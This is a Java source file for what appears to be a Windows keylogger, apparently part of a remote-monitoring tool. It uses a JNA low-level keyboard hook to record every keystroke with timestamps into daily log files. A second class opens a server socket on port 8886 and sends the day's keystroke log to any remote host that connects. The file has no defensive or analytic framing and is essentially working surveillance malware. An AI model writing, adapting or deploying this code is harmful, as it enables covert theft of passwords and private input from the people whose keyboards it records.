package server;

import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;

public class ServerKeyboardRecord {
    public ServerKeyboardRecord() {
        KeyboardHook KeyboardHook = new KeyboardHook(null);
        KeyboardHook.run();
    }
}
class KeyboardHook implements Runnable {
    static final String KEYBORD_STRINGS[] = { " ", "mouse leftkey",
            "mouse rightkey", "cancel", "mouse midlekey", "error", "error",
            "error", "backspace", "tab", "error", "error", "clear" + "",
            "enter", "error", "error", "shift", "ctrl", "menu", "pause",
            "caps lock", "error", "error", "error", "error", "error", "error",
            "esc", "error", "error", "error", "error", "spacebar", "page up",
            "page down", "end", "home", "left", "up", "right", "down",
            "select", "print screen" + "", "execute", "snap shot", "ins",
            "del", "help", "0)", "1!", "2@", "3#", "4$", "5%", "6^", "7&",
            "8*", "9(", "error", "error", "error", "error", "error", "error",
            "error", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k",
            "l", "m", "n", "o", "p", "q", "r", "s", "t" + "", "u", "v", "w",
            "x", "y", "z", "error", "error", "error", "error", "error", "num0",
            "num1", "num2", "num3", "num4", "num5", "num6", "num7", "num8",
            "num9", "*", "+", "enter", "-", ".", "//", "F1", "F2", "F3", "F4",
            "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "num lock", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", ";:", "=+",
            "，<", "-_", ".>", "/?", "`~", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "error", "error", "error", "error", "error", "error",
            "error", "[{", "\\|", "]}", "'\"" };
    private static HHOOK hhk;
    private static LowLevelKeyboardProc keyboardHook;
    final static User32 lib = User32.INSTANCE;
    private boolean[] on_off = null;
    private int count_forExit = 0; //连续输入八个o退出键盘记录

    public KeyboardHook(boolean[] on_off) {
        this.on_off = on_off;
    }

    public void run() {

        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = new LowLevelKeyboardProc() {
            public LRESULT callback(int nCode, WPARAM wParam,
                                    KBDLLHOOKSTRUCT info) {
                SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
                SimpleDateFormat df2 = new SimpleDateFormat(
                        "yyyy-MM-dd HH:mm:ss");
                String fileName = df1.format(new Date());
                String time = df2.format(new Date());
                BufferedWriter bw1 = null;
                BufferedWriter bw2 = null;
                try {
                    bw1 = new BufferedWriter(new FileWriter(
                            (new File(".").getCanonicalPath()+"\\"
                                    + fileName + "_Keyboard.txt"), true));
                    bw2 = new BufferedWriter(new FileWriter(
                            (new File(".").getCanonicalPath()+"\\"
                                    + fileName + "_Common.txt"), true));

                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (info.vkCode == 79) {
                    count_forExit++;
                    System.out.print(count_forExit);
                    if (count_forExit == 16)
                        System.exit(0);
                } else {
                    count_forExit = 0;
                } //按下o键的计数，连续单击八次o退出整体监控程序

                try {
                    String vkcodeString = change(info.vkCode);
                    bw1.write(time + "  ####  " + vkcodeString + "\r\n");
                    bw2.write(time + "  ####  " + vkcodeString + "\r\n"); //写入文件
                    bw1.flush();

                    bw2.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                Pointer ptr = info.getPointer();
                long peer = Pointer.nativeValue(ptr);
                return lib.CallNextHookEx(hhk, nCode, wParam, new LPARAM(peer)); //挂入下一个钩子
            }

            private String change(int vkCode) {
                // TODO Auto-generated method stub
                String vkString = null;
                vkString = KEYBORD_STRINGS[vkCode];

                return vkString;
            }
        };
        hhk = lib
                .SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
        int result;
        MSG msg = new MSG();
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                System.err.println("error in get message");
                break;
            } else {
                System.err.println("got message");
                lib.TranslateMessage(msg);
                lib.DispatchMessage(msg);
            }
        }
        lib.UnhookWindowsHookEx(hhk);
    }
}

/**
 * 我脑溢血都快看出来了,乱开线程
 * */
class send_keybord implements Runnable {
    public static int port=8886;
    public void setport(int port){
        this.port=port;
    }

    public void send() {
        SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
        String fileName = df1.format(new Date());

        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(999999999);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (Flag.isWorking) {
                try {
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    String path=(new File("")).getAbsoluteFile()+"\\"+fileName+"_Keyboard.txt";
                    DataInputStream fis=new DataInputStream(new FileInputStream(path));

                    DataOutputStream out = new DataOutputStream(server.getOutputStream());
                    byte[] buf=new byte[1024];
                    int len=0;
                    while((len=fis.read(buf))!=-1)
                    {
                        out.write(buf,0,len);
                    }
                    out.flush();
                    server.shutdownOutput();
                    serverSocket.setSoTimeout(999999999);
                    fis.close();
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Keyboard Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
    public void run() {
        send();
    }
}
